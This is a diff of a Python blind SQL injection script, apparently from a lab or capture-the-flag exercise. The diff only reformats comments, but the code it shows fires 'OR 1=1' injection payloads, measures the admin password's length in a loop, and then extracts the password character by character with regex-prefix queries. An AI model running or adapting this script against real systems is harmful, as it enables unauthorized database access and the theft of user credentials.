@@ -36,8 +36,10 @@ def try_query(query):
 print(try_query("""x' OR 1=1 --"""))
 print(try_query("""x" OR 1=1 --"""))
 
-#Determines the length of the password
-#by locating the admin password length in SQL
+'''
+Determines the length of the password
+by locating the admin password length in SQL
+'''
 begin_time = time.perf_counter()
 num = 1
 while True:
@@ -51,9 +53,10 @@ while True:
 print(f"Password length is {num}")
 print(f"Time elapsed is {time.perf_counter()-begin_time}")
 
-
-#Begins Linear search to determine the password for the program
-#First for loop collects the first character of the password
+'''
+Begins Linear search to determine the password for the program
+First for loop collects the first character of the password
+'''
 for i in range(len(characters)):
     query1 = f"{query_pass} ~ '^{characters[i]}'--"
     if try_query(query1) == False:
@@ -63,8 +66,12 @@ for i in range(len(characters)):
         try_password.append(characters[i])
         break
 
-#Iterates through the rest of the password
-for i in range(num - 1):
+'''
+Iterates through the rest of the password
+-Takes the number of characters from above 
+and uses that as a bound.
+'''
+for i in range(num-1):
     print(f"Current Password: {try_password[0]}")
     for i in range(len(characters)):
         query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
